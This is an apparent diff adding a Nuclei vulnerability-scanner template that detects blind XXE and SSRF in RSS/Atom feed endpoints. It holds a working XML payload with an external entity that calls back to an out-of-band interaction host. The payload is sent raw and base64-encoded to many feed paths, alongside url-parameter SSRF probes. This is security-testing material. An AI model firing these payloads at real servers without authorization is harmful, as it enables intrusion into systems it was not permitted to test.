@@ -1,0 +1,122 @@
+id: rss-xxe-blind
+
+info:
+  name: RSS XXE Blind Detection
+  author: nuclei-templates
+  severity: critical
+  description: Détecte les vulnérabilités XXE blind dans les endpoints RSS/Atom via payload XML malveillant
+  tags: rss,atom,xxe,blind,ssrf
+
+variables:
+  rss_payload: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE rss [<!ENTITY % remote SYSTEM \"http://{{interactsh-url}}\">%remote;]><rss version=\"2.0\"></rss>"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/feed"
+      - "{{BaseURL}}/rss"
+      - "{{BaseURL}}/rss.xml"
+      - "{{BaseURL}}/feed.xml"
+      - "{{BaseURL}}/atom.xml"
+      - "{{BaseURL}}/feeds"
+      - "{{BaseURL}}/rss/feed"
+      - "{{BaseURL}}/feed/rss"
+      - "{{BaseURL}}/atom"
+      - "{{BaseURL}}/atom/feed"
+      - "{{BaseURL}}/feeds/all"
+      - "{{BaseURL}}/feeds/rss"
+      - "{{BaseURL}}/feeds/atom"
+      - "{{BaseURL}}/blog/feed"
+      - "{{BaseURL}}/blog/rss"
+      - "{{BaseURL}}/news/feed"
+      - "{{BaseURL}}/news/rss"
+      - "{{BaseURL}}/xml/rss"
+      - "{{BaseURL}}/xml/feed"
+      - "{{BaseURL}}/api/feed"
+      - "{{BaseURL}}/api/rss"
+
+    headers:
+      Content-Type: application/xml
+      Accept: application/xml,text/xml,*/*;q=0.9
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+
+    body: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE rss [<!ENTITY % remote SYSTEM \"http://{{interactsh-url}}\">%remote;]><rss version=\"2.0\"></rss>"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+        condition: and
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/feed"
+      - "{{BaseURL}}/rss"
+      - "{{BaseURL}}/rss.xml"
+      - "{{BaseURL}}/feed.xml"
+      - "{{BaseURL}}/atom.xml"
+      - "{{BaseURL}}/feeds"
+      - "{{BaseURL}}/api/feed"
+      - "{{BaseURL}}/api/rss"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Accept: application/xml,text/xml,*/*;q=0.9
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+
+    body: "&xml={{base64(rss_payload)}}"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+        condition: and
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/feed"
+      - "{{BaseURL}}/rss"
+      - "{{BaseURL}}/rss.xml"
+      - "{{BaseURL}}/feed.xml"
+      - "{{BaseURL}}/atom.xml"
+      - "{{BaseURL}}/feeds"
+      - "{{BaseURL}}/api/feed"
+      - "{{BaseURL}}/api/rss"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Accept: application/xml,text/xml,*/*;q=0.9
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+
+    body: "&feed={{base64(rss_payload)}}"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+        condition: and
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/feed?url=http://{{interactsh-url}}"
+      - "{{BaseURL}}/rss?url=http://{{interactsh-url}}"
+      - "{{BaseURL}}/feed.xml?url=http://{{interactsh-url}}"
+      - "{{BaseURL}}/rss.xml?url=http://{{interactsh-url}}"
+      - "{{BaseURL}}/atom.xml?url=http://{{interactsh-url}}"
+      - "{{BaseURL}}/feeds?url=http://{{interactsh-url}}"
+      - "{{BaseURL}}/api/feed?url=http://{{interactsh-url}}"
+      - "{{BaseURL}}/api/rss?url=http://{{interactsh-url}}"
+
+    headers:
+      Accept: application/xml,text/xml,*/*;q=0.9
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+        condition: and
